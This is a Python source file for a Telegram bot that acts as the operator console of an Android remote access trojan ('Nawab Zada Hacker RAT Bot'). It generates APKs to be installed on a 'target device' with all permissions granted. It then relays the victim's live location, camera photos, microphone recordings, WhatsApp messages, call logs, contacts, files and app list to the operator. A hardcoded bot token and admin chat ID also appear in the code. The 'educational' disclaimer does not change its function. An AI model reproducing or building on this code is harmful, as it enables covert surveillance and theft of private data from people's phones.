import telebot
from telebot import types
from datetime import datetime
import json
import os
import requests
from database import DeviceDatabase
from apk_generator import APKGenerator
from flask import Flask, request

# ========== CONFIGURATION ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8843847471:AAH9bVq42LmbzD1bOHj6vT80eC8n5v4BdOU')
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '7420647897')
# ===================================

bot = telebot.TeleBot(BOT_TOKEN)
db = DeviceDatabase()
apk_gen = APKGenerator()

app = Flask(__name__)

# Device data storage
devices = {}
active_sessions = {}

WELCOME_MSG = """🎉 *Welcome To Nawab Zada Hacker RAT Bot!* 🎉

📱 *Features:*
✅ Generate APK for any Android
✅ Live Location Tracking
✅ WhatsApp Messages Monitor
✅ Call Logs (Incoming/Outgoing)
✅ Camera (Front & Back) Photos
✅ Microphone Recording
✅ SMS Reading
✅ Contacts Access
✅ File Manager
✅ App List
✅ Battery & Network Info

⚠️ *This bot is only for educational purpose please don't use wrong...*

Press /start to begin!"""

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id

    if chat_id != int(ADMIN_CHAT_ID) and ADMIN_CHAT_ID:
        bot.send_message(chat_id, "❌ Please contact admin to get access.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📱 Generate APK", callback_data="gen_apk")
    btn2 = types.InlineKeyboardButton("📊 My Devices", callback_data="my_devices")
    btn3 = types.InlineKeyboardButton("🔍 All Features", callback_data="features")
    btn4 = types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
    markup.add(btn1, btn2, btn3, btn4)

    bot.send_message(chat_id, WELCOME_MSG, parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "gen_apk":
        handle_generate_apk(call)
    elif call.data == "my_devices":
        handle_my_devices(call)
    elif call.data == "features":
        handle_features(call)
    elif call.data == "settings":
        handle_settings(call)
    elif call.data.startswith("dev_"):
        handle_device_menu(call)
    elif call.data.startswith("action_"):
        handle_device_action(call)
    elif call.data == "back":
        start(call.message)
    elif call.data == "confirm":
        call.answer("Confirmed! ✅")
    else:
        call.answer()

def handle_generate_apk(call):
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    markup.add(btn)

    msg = bot.send_message(
        call.message.chat.id,
        "📱 *Enter APK Name* (e.g., MyScanner):\n\n⚠️ Only letters and numbers",
        parse_mode='Markdown',
        reply_markup=markup
    )
    bot.register_next_step_handler(msg, process_apk_name)

def process_apk_name(message):
    apk_name = message.text.strip()
    chat_id = message.chat.id

    if not apk_name or not apk_name.replace(' ', '').isalnum():
        bot.send_message(chat_id, "❌ Invalid name! Use only letters and numbers.")
        return

    apk_url = apk_gen.generate_apk(apk_name, chat_id)

    bot.send_message(
        chat_id,
        f"✅ *APK Generated Successfully!*\n\n📱 Name: {apk_name}\n🔗 Download: {apk_url}\n\n⚠️ Install on target device and allow ALL permissions!",
        parse_mode='Markdown'
    )

def handle_my_devices(call):
    chat_id = call.message.chat.id
    devices_list = db.get_devices(chat_id)

    if not devices_list:
        bot.send_message(chat_id, "📭 No devices connected yet.\n\nInstall APK on target device first.")
        return

    markup = types.InlineKeyboardMarkup()
    for dev in devices_list:
        btn = types.InlineKeyboardButton(
            f"📱 {dev['name']} ({dev['model']})",
            callback_data=f"dev_{dev['device_id']}"
        )
        markup.add(btn)

    back_btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    markup.add(back_btn)

    bot.send_message(chat_id, "📱 *Your Connected Devices:*", parse_mode='Markdown', reply_markup=markup)

def handle_device_menu(call):
    dev_id = call.data.replace("dev_", "")
    device = db.get_device(dev_id)

    if not device:
        bot.send_message(call.message.chat.id, "❌ Device not found.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📍 Live Location", callback_data=f"action_loc_{dev_id}")
    btn2 = types.InlineKeyboardButton("📸 Camera", callback_data=f"action_cam_{dev_id}")
    btn3 = types.InlineKeyboardButton("🎤 Mic Record", callback_data=f"action_mic_{dev_id}")
    btn4 = types.InlineKeyboardButton("💬 WhatsApp", callback_data=f"action_whatsapp_{dev_id}")
    btn5 = types.InlineKeyboardButton("📞 Call Logs", callback_data=f"action_calls_{dev_id}")
    btn6 = types.InlineKeyboardButton("📁 Files", callback_data=f"action_files_{dev_id}")
    btn7 = types.InlineKeyboardButton("📱 Apps", callback_data=f"action_apps_{dev_id}")
    btn8 = types.InlineKeyboardButton("📞 Contacts", callback_data=f"action_contacts_{dev_id}")
    btn9 = types.InlineKeyboardButton("📊 Device Info", callback_data=f"action_info_{dev_id}")
    btn10 = types.InlineKeyboardButton("🔙 Back", callback_data="my_devices")

    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10)

    info = f"""📱 *Device Info:*
🆔 ID: {device['device_id']}
📛 Name: {device['name']}
📟 Model: {device['model']}
🤖 Android: {device['android_version']}
🔋 Battery: {device.get('battery', 'Unknown')}%
🕐 Last Seen: {device.get('last_seen', 'Never')}
"""
    bot.send_message(call.message.chat.id, info, parse_mode='Markdown', reply_markup=markup)

def handle_device_action(call):
    action = call.data.split("_")[1]
    dev_id = call.data.split("_")[-1]
    chat_id = call.message.chat.id
    device = db.get_device(dev_id)

    if not device:
        bot.send_message(chat_id, "❌ Device not found.")
        return

    if action == "loc":
        location = device.get('location', {})
        if location:
            bot.send_location(chat_id, location.get('lat', 0), location.get('lon', 0))
            bot.send_message(chat_id, f"📍 *Live Location*\nLatitude: {location.get('lat')}\nLongitude: {location.get('lon')}\nAccuracy: {location.get('accuracy', 'Unknown')}m", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "📍 Location not available.")

    elif action == "cam":
        bot.send_message(chat_id, "📸 Taking photo from device...")
        photos = device.get('photos', [])
        if photos:
            for photo_url in photos[-5:]:
                bot.send_photo(chat_id, photo_url)
        else:
            bot.send_message(chat_id, "📸 No photos captured yet.")

    elif action == "mic":
        bot.send_message(chat_id, "🎤 Recording audio from device...")
        audio_files = device.get('audio', [])
        if audio_files:
            for audio_url in audio_files[-3:]:
                bot.send_audio(chat_id, open(audio_url, 'rb'))
        else:
            bot.send_message(chat_id, "🎤 No audio recordings yet.")

    elif action == "whatsapp":
        messages = device.get('whatsapp_messages', [])
        if messages:
            msg_text = "💬 *WhatsApp Messages:*\n\n"
            for msg in messages[-10:]:
                msg_text += f"👤 {msg.get('contact', 'Unknown')}: {msg.get('message', '')}\n⏰ {msg.get('time', '')}\n\n"
            bot.send_message(chat_id, msg_text[:4000], parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "💬 No WhatsApp messages yet.")

    elif action == "calls":
        calls = device.get('call_logs', [])
        if calls:
            msg_text = "📞 *Call Logs:*\n\n"
            for call in calls[-10:]:
                msg_text += f"📞 {call.get('number', 'Unknown')}\nType: {call.get('type', '')}\nTime: {call.get('time', '')}\nDuration: {call.get('duration', '')}\n\n"
            bot.send_message(chat_id, msg_text, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "📞 No call logs yet.")

    elif action == "files":
        files = device.get('files', [])
        if files:
            msg_text = "📁 *Files:*\n\n"
            for file in files[-10:]:
                msg_text += f"📄 {file.get('name', '')}\nSize: {file.get('size', '')}\nPath: {file.get('path', '')}\n\n"
            bot.send_message(chat_id, msg_text, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "📁 No files found.")

    elif action == "apps":
        apps = device.get('apps', [])
        if apps:
            msg_text = "📱 *Installed Apps:*\n\n"
            for app in apps[-15:]:
                msg_text += f"📱 {app.get('name', '')}\nPackage: {app.get('package', '')}\n\n"
            bot.send_message(chat_id, msg_text, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "📱 No apps found.")

    elif action == "contacts":
        contacts = device.get('contacts', [])
        if contacts:
            msg_text = "📞 *Contacts:*\n\n"
            for contact in contacts[-15:]:
                msg_text += f"👤 {contact.get('name', '')}\n📞 {contact.get('phone', '')}\n\n"
            bot.send_message(chat_id, msg_text, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "📞 No contacts found.")

    elif action == "info":
        info = f"""📱 *Full Device Info:*
🆔 Device ID: {device['device_id']}
📛 Name: {device['name']}
📟 Model: {device['model']}
🤖 Android: {device['android_version']}
🔋 Battery: {device.get('battery', 'Unknown')}%
📡 Network: {device.get('network', 'Unknown')}
💾 Storage: {device.get('storage', 'Unknown')}
🔐 Permissions: {len(device.get('permissions', []))}
🕐 Last Seen: {device.get('last_seen', 'Never')}
"""
        bot.send_message(chat_id, info, parse_mode='Markdown')

    call.answer()

def handle_features(call):
    features = """🎯 *Bot Features:*

📱 *Device Monitoring:*
• Live Location Tracking
• Device Info (Model, Android, Battery)
• Network Status

📸 *Camera:*
• Front Camera Photos
• Back Camera Photos
• Live Camera Stream

🎤 *Audio:*
• Microphone Recording
• Call Recording

💬 *Messages:*
• WhatsApp Messages
• SMS Reading
• Call Logs

📁 *Files:*
• File Manager
• App List
• Contacts Access

⚙️ *Settings:*
• Bot Token Setup
• Chat ID Setup
• Device Management
"""
    bot.send_message(call.message.chat.id, features, parse_mode='Markdown')

def handle_settings(call):
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("🔑 Set Bot Token", callback_data="set_token")
    btn2 = types.InlineKeyboardButton("🆔 Set Chat ID", callback_data="set_chatid")
    btn3 = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    markup.add(btn1, btn2, btn3)

    bot.send_message(call.message.chat.id, "⚙️ *Settings*:\n\nConfigure your bot settings below:", parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith("DATA:"))
def receive_device_data(message):
    try:
        data = json.loads(message.text.replace("DATA:", ""))
        db.update_device(data)
        bot.send_message(ADMIN_CHAT_ID, f"✅ Data received from device: {data.get('device_id', 'Unknown')}")
    except Exception as e:
        print(f"Error receiving data: {e}")

@app.route('/' + BOT_TOKEN, methods=['POST'])
def webhook():
    bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
    return "ok", 200

@app.route("/")
def index():
    return "Bot is running!", 200

if __name__ == '__main__':
    print("Starting bot...")
    webhook_url = f'https://{os.environ.get("RENDER_EXTERNAL_HOSTNAME", "nawab.pythonanywhere.com")}/{BOT_TOKEN}'
    bot.set_webhook(url=webhook_url)
    print(f"Webhook set to: {webhook_url}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
